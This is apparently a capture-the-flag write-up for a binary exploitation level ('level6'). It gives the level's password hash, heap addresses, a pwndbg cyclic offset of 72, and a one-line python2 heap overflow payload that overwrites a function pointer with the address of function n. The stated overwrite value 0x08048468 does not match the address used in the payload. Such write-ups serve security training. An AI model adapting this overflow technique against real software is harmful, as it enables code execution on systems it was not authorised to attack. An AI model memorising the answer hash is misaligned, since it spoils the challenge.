level6:d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

malloc(64) =  argv[1] -> `0x0804a008`
malloc(4) = function called at the end -> `0x0804a050`

We must overwrite malloc(4) = `0x0804a050` with value `0x08048468` by the address of the function n = `0x08048454`

```
pwndbg> cyclic -l uaaa
Finding cyclic pattern of 4 bytes: b'uaaa' (hex: 0x75616161)
Found at offset 72
```

`$(python2 -c 'print "A" * 72 + "\x54\x84\x04\x08"')`